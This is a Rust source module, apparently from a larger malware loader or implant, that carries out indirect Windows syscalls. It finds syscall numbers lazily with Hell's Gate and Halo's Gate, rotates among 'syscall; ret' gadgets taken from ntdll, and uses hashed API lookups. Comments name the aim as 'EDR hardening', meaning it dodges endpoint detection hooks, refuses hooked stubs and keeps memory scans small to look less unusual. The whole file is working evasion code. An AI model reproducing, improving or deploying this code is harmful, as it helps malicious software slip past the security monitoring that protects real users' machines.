// Syscall Resolution & Execution Module
//
// x86_64: Indirect syscalls via lazy SSN resolution (Hell's/Halo's Gate) + gadget pool
// x86: Direct ntdll API calls (no indirect syscall on 32-bit)
//
// Supports: Windows Vista SP2+ (both 32-bit and 64-bit)
//
// Design goals (EDR hardening):
// - No eager full-export Nt* SSN scan at startup
// - Resolve SSN only for requested hashes (with neighbor search if hooked)
// - Maintain a small rotating pool of `syscall; ret` gadgets (no repeated .text sweeps)

#[cfg(all(windows, target_arch = "x86_64"))]
use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
#[cfg(all(windows, target_arch = "x86_64"))]
use std::sync::{Mutex, OnceLock};

#[cfg(all(windows, target_arch = "x86_64"))]
use winapi::um::winnt::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;
#[cfg(all(windows, target_arch = "x86_64"))]
use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_SECTION_HEADER};

// ═══════════════════════════════════════════════════════════════════════════════
// x86_64: Lazy SSN + gadget pool
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(all(windows, target_arch = "x86_64"))]
const MAX_GADGETS: usize = 8;
/// Typical x64 ntdll Nt* stub stride used by Halo's Gate neighbor walk.
#[cfg(all(windows, target_arch = "x86_64"))]
const STUB_STRIDE: usize = 0x20;
#[cfg(all(windows, target_arch = "x86_64"))]
const HALO_MAX_NEIGHBORS: usize = 500;

#[cfg(all(windows, target_arch = "x86_64"))]
struct SyscallState {
    gadgets: Vec<usize>,
}

#[cfg(all(windows, target_arch = "x86_64"))]
fn syscall_state() -> &'static Mutex<SyscallState> {
    static STATE: OnceLock<Mutex<SyscallState>> = OnceLock::new();
    STATE.get_or_init(|| {
        // Acceptance signal: no eager Nt* SSN scan at startup.
        #[cfg(debug_assertions)]
        crate::db_print!("[*] syscall layer: lazy resolved 0 on init (SSN on-demand)");
        Mutex::new(SyscallState {
            gadgets: Vec::with_capacity(MAX_GADGETS),
        })
    })
}

// ────────────────────────────────────────────────────────────────────────────
// SSN cache: direct-mapped ATOMIC SLOTS (TLS-free, allocation-free, lock-free).
// Same rationale as stealth::peb::EXPORT_CACHE — std HashMap's RandomState
// touches a thread_local that AVs under pe_map TLS neutralization in L2
// modules (TLS_SENTINEL_INDEX = 0x7FFFFFFF → gs:[0x58] walk → 0xC0000005).
// Slot = hash % SLOTS; value packs (hash << 32) | ssn; tag validated on read.
// ────────────────────────────────────────────────────────────────────────────

/// SSN cache slots (direct-mapped by syscall-name hash). x64 only.
#[cfg(all(windows, target_arch = "x86_64"))]
const SSN_CACHE_SLOTS: usize = 64;

#[cfg(all(windows, target_arch = "x86_64"))]
static SSN_CACHE: [AtomicU64; SSN_CACHE_SLOTS] = {
    const ZERO: AtomicU64 = AtomicU64::new(0);
    [ZERO; SSN_CACHE_SLOTS]
};

#[cfg(all(windows, target_arch = "x86_64"))]
#[inline]
fn ssn_cache_get(hash: u32) -> Option<u16> {
    let v = SSN_CACHE[(hash as usize) % SSN_CACHE_SLOTS].load(Ordering::Acquire);
    if (v >> 32) as u32 == hash && (v & 0xFFFF) as u16 != 0xFFFF {
        Some((v & 0xFFFF) as u16)
    } else {
        None
    }
}

#[cfg(all(windows, target_arch = "x86_64"))]
#[inline]
fn ssn_cache_put(hash: u32, ssn: u16) {
    let v = ((hash as u64) << 32) | (ssn as u64);
    SSN_CACHE[(hash as usize) % SSN_CACHE_SLOTS].store(v, Ordering::Release);
}

#[cfg(all(windows, target_arch = "x86_64"))]
static GADGET_RR: AtomicUsize = AtomicUsize::new(0);

/// Extract SSN from a clean x64 syscall stub, if present.
///
/// Returns `(ssn, gadget)` where `gadget` is the address of the stub's own
/// `syscall; ret` when present. Stub shapes seen in the wild:
/// - short (hotpatch):  4C 8B D1 B8 XX XX XX XX 0F 05 C3          (gadget at +8)
/// - standard (modern, incl. Win11 25H2+/build 26200):
///   4C 8B D1 B8 XX XX XX XX F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E C3
///   (gadget at +18). We scan the stub body instead of hardcoding one offset.
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn extract_ssn_from_stub(addr: usize) -> Option<(u16, usize)> {
    if addr == 0 {
        return None;
    }
    let bytes = std::slice::from_raw_parts(addr as *const u8, 32);

    // First `syscall; ret` inside the stub body (after the SSN dword).
    let find_gadget = |b: &[u8]| -> usize {
        let mut k = 8usize;
        while k + 2 < b.len() {
            if b[k] == 0x0F && b[k + 1] == 0x05 && b[k + 2] == 0xC3 {
                return addr + k;
            }
            k += 1;
        }
        0
    };

    // Pattern 1: 4C 8B D1 ; B8 XX XX XX XX  (mov r10, rcx; mov eax, SSN)
    if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
        let ssn = u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]) as u16;
        return Some((ssn, find_gadget(bytes)));
    }

    // Pattern 2: B8 XX XX XX XX ; 4C 8B D1
    if bytes[0] == 0xB8 && bytes[5] == 0x4C && bytes[6] == 0x8B && bytes[7] == 0xD1 {
        let ssn = u32::from_le_bytes([bytes[1], bytes[2], bytes[3], bytes[4]]) as u16;
        return Some((ssn, find_gadget(bytes)));
    }

    None
}

/// Remember a gadget address (deduped, capped).
#[cfg(all(windows, target_arch = "x86_64"))]
fn remember_gadget(state: &mut SyscallState, gadget: usize) {
    if gadget == 0 || state.gadgets.len() >= MAX_GADGETS {
        return;
    }
    if !state.gadgets.contains(&gadget) {
        state.gadgets.push(gadget);
    }
}

/// One-shot limited harvest of `syscall; ret` gadgets from ntdll executable sections.
/// Stops after MAX_GADGETS hits — does not rescan on subsequent calls.
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn harvest_gadget_pool(state: &mut SyscallState) {
    if !state.gadgets.is_empty() {
        return;
    }

    let ntdll_base =
        crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
    if ntdll_base == 0 {
        return;
    }

    let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
    let nt_headers = (ntdll_base + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    let section_header =
        (nt_headers as usize + 24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize)
            as *const IMAGE_SECTION_HEADER;
    let num_sections = (*nt_headers).FileHeader.NumberOfSections;

    for i in 0..num_sections {
        if state.gadgets.len() >= MAX_GADGETS {
            break;
        }
        let section = *section_header.add(i as usize);
        // IMAGE_SCN_MEM_EXECUTE
        if (section.Characteristics & 0x2000_0000) == 0 {
            continue;
        }
        let addr = ntdll_base + section.VirtualAddress as usize;
        let size = *section.Misc.VirtualSize() as usize;
        if size < 3 {
            continue;
        }

        // Cap scan window to reduce anomalous full-section reads. Modern
        // ntdll (Win11 25H2+/build 26200) places syscall stubs far past the
        // first 0x20000 of .text (observed: first 0F 05 C3 at ~0x15ebe2 in a
        // 0x16937a-byte .text), so a 128KB window harvests nothing. ntdll is
        // bounded (~2MB today), so a 4MB cap still keeps reads finite while
        // covering every known layout.
        let scan_len = size.min(0x400000);
        let mem = std::slice::from_raw_parts(addr as *const u8, scan_len);
        let mut j = 0;
        while j + 2 < scan_len && state.gadgets.len() < MAX_GADGETS {
            if mem[j] == 0x0F && mem[j + 1] == 0x05 && mem[j + 2] == 0xC3 {
                remember_gadget(state, addr + j);
                // Skip ahead — stubs are spaced; avoid dense duplicate hits
                j += STUB_STRIDE;
            } else {
                j += 1;
            }
        }
    }

    if state.gadgets.is_empty() {
        #[cfg(debug_assertions)]
        crate::db_print!("[*] ROP pool empty after limited harvest");
    } else {
        #[cfg(debug_assertions)]
        crate::db_print!(
            "[*] ROP pool ready: {} entries",
            state.gadgets.len()
        );
    }
}

/// SizeOfImage for ntdll module (bounds Halo's Gate walk).
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn ntdll_image_size(ntdll_base: usize) -> usize {
    if ntdll_base == 0 {
        return 0;
    }
    let dos = ntdll_base as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != 0x5A4D {
        return 0x200000; // conservative fallback ~2MB
    }
    let nt = (ntdll_base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    let size = (*nt).OptionalHeader.SizeOfImage as usize;
    if size == 0 {
        0x200000
    } else {
        size
    }
}

/// Lazy SSN resolve: cache → clean stub → Halo's Gate neighbors.
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn resolve_ssn(hash: u32) -> Option<u16> {
    if let Some(ssn) = ssn_cache_get(hash) {
        return Some(ssn);
    }

    let ntdll_base =
        crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
    if ntdll_base == 0 {
        return None;
    }

    let api_addr = crate::stealth::get_api_addr(ntdll_base, hash).unwrap_or(0);
    if api_addr == 0 {
        return None;
    }

    // Hell's Gate: clean stub at target
    if let Some((ssn, gadget)) = extract_ssn_from_stub(api_addr) {
        ssn_cache_put(hash, ssn);
        if let Ok(mut state) = syscall_state().lock() {
            remember_gadget(&mut state, gadget);
            if state.gadgets.is_empty() {
                harvest_gadget_pool(&mut state);
            }
        }
        return Some(ssn);
    }

    // Module size bound (SizeOfImage) so Halo walk never leaves ntdll
    let ntdll_end = ntdll_base.wrapping_add(unsafe { ntdll_image_size(ntdll_base) });

    // Halo's Gate: walk neighboring stubs; try fixed stride then +1 pattern scan
    for i in 1..=HALO_MAX_NEIGHBORS {
        for &stride in &[STUB_STRIDE, 0x10usize, 0x20usize] {
            let down = api_addr.wrapping_add(i * stride);
            // extract reads 32 bytes — keep the whole probe inside ntdll
            if down + 32 > ntdll_end {
                break;
            }
            if let Some((neigh_ssn, gadget)) = extract_ssn_from_stub(down) {
                let ssn = neigh_ssn.wrapping_sub(i as u16);
                ssn_cache_put(hash, ssn);
                if let Ok(mut state) = syscall_state().lock() {
                    remember_gadget(&mut state, gadget);
                    if state.gadgets.is_empty() {
                        harvest_gadget_pool(&mut state);
                    }
                }
                return Some(ssn);
            }

            let up = api_addr.wrapping_sub(i * stride);
            if up < ntdll_base || up + 32 > ntdll_end {
                continue;
            }
            if let Some((neigh_ssn, gadget)) = extract_ssn_from_stub(up) {
                let ssn = neigh_ssn.wrapping_add(i as u16);
                ssn_cache_put(hash, ssn);
                if let Ok(mut state) = syscall_state().lock() {
                    remember_gadget(&mut state, gadget);
                    if state.gadgets.is_empty() {
                        harvest_gadget_pool(&mut state);
                    }
                }
                return Some(ssn);
            }
        }
    }

    // Ensure gadget pool exists even if SSN failed (for other calls)
    if let Ok(mut state) = syscall_state().lock() {
        if state.gadgets.is_empty() {
            harvest_gadget_pool(&mut state);
        }
    }

    None
}

#[cfg(all(windows, target_arch = "x86_64"))]
fn pick_gadget() -> usize {
    let Ok(mut state) = syscall_state().lock() else {
        return 0;
    };
    if state.gadgets.is_empty() {
        unsafe {
            harvest_gadget_pool(&mut state);
        }
    }
    if state.gadgets.is_empty() {
        return 0;
    }
    let idx = GADGET_RR.fetch_add(1, Ordering::Relaxed) % state.gadgets.len();
    state.gadgets[idx]
}

/// x86_64 indirect syscall execution
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
    // Never fall back to hooked ntdll export stubs — fail closed.
    let ssn = match resolve_ssn(hash) {
        Some(s) => s,
        None => {
            #[cfg(debug_assertions)]
            crate::db_print!(
                "[*] SSN not found for 0x{:X}, refusing hooked stub fallback",
                hash
            );
            return -1; // STATUS_UNSUCCESSFUL-ish
        }
    };

    let gadget = pick_gadget();
    if gadget == 0 {
        #[cfg(debug_assertions)]
        crate::db_print!("[*] No syscall gadget, refusing hooked stub fallback");
        return -1;
    }

    let mut a = [0usize; 11];
    for (i, &v) in args.iter().enumerate() {
        if i < 11 {
            a[i] = v;
        }
    }

    let mut result: i32;

    // Indirect syscall via gadget from pool
    std::arch::asm!(
        "mov r12, rsp",
        "sub rsp, 0x68",
        "and rsp, -16",

        "mov r13, [r14 + 32]", "mov [rsp + 0x20], r13",
        "mov r13, [r14 + 40]", "mov [rsp + 0x28], r13",
        "mov r13, [r14 + 48]", "mov [rsp + 0x30], r13",
        "mov r13, [r14 + 56]", "mov [rsp + 0x38], r13",
        "mov r13, [r14 + 64]", "mov [rsp + 0x40], r13",
        "mov r13, [r14 + 72]", "mov [rsp + 0x48], r13",
        "mov r13, [r14 + 80]", "mov [rsp + 0x50], r13",

        "mov r10, rcx",
        "call r15",

        "mov rsp, r12",

        inout("rax") ssn as i32 => result,
        in("r14") a.as_ptr(),
        in("r15") gadget,
        out("r10") _,
        out("r12") _,
        out("r13") _,
        in("rcx") a[0],
        in("rdx") a[1],
        in("r8") a[2],
        in("r9") a[3],
        lateout("r11") _,
        clobber_abi("system")
    );

    result
}

/// D/Invoke fallback: call ntdll API directly by hash (x86_64)
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn direct_api_call(hash: u32, a: &[usize; 11]) -> i32 {
    let ntdll_base =
        crate::stealth::peb::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
    if ntdll_base == 0 {
        return -1;
    }

    let api_addr = crate::stealth::peb::get_api_addr(ntdll_base, hash).unwrap_or(0);
    if api_addr == 0 {
        return -1;
    }

    let mut result: i32;
    std::arch::asm!(
        "mov r12, rsp",
        "sub rsp, 0x68",
        "and rsp, -16",

        "mov r13, [r14 + 32]", "mov [rsp + 0x20], r13",
        "mov r13, [r14 + 40]", "mov [rsp + 0x28], r13",
        "mov r13, [r14 + 48]", "mov [rsp + 0x30], r13",
        "mov r13, [r14 + 56]", "mov [rsp + 0x38], r13",
        "mov r13, [r14 + 64]", "mov [rsp + 0x40], r13",
        "mov r13, [r14 + 72]", "mov [rsp + 0x48], r13",
        "mov r13, [r14 + 80]", "mov [rsp + 0x50], r13",

        "call r15",
        "mov rsp, r12",

        in("r14") a.as_ptr(),
        in("r15") api_addr,
        out("r12") _,
        out("r13") _,
        in("rcx") a[0],
        in("rdx") a[1],
        in("r8") a[2],
        in("r9") a[3],
        lateout("rax") result,
        clobber_abi("system")
    );
    result
}

// ═══════════════════════════════════════════════════════════════════════════════
// x86 (32-bit): Direct ntdll API calls via PEB resolution
// ═══════════════════════════════════════════════════════════════════════════════

/// x86: resolve ntdll API by hash and call directly (stdcall).
#[cfg(all(windows, target_arch = "x86"))]
pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
    let ntdll_base =
        crate::stealth::peb::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
    if ntdll_base == 0 {
        return -1;
    }

    let api_addr = crate::stealth::peb::get_api_addr(ntdll_base, hash).unwrap_or(0);
    if api_addr == 0 {
        #[cfg(debug_assertions)]
        crate::db_print!(
            "[x86] API not found for hash 0x{:X}",
            hash
        );
        return -1;
    }

    let argc = args.len();
    let result: i32;
    let args_ptr = args.as_ptr();

    std::arch::asm!(
        "mov edi, esp",
        "mov ecx, {argc}",
        "test ecx, ecx",
        "jz 99f",
        "mov edx, {args_ptr}",
        "lea edx, [edx + ecx*4 - 4]",
        "98:",
        "push dword ptr [edx]",
        "sub edx, 4",
        "dec ecx",
        "jnz 98b",
        "99:",
        "call {func}",
        "mov esp, edi",

        argc = in(reg) argc,
        args_ptr = in(reg) args_ptr,
        func = in(reg) api_addr,
        out("edi") _,
        out("ecx") _,
        out("edx") _,
        lateout("eax") result,
    );

    result
}

// ═══════════════════════════════════════════════════════════════════════════════
// Non-Windows stub
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(not(windows))]
pub unsafe fn indirect_syscall(_hash: u32, _args: &[usize]) -> i32 {
    -1
}
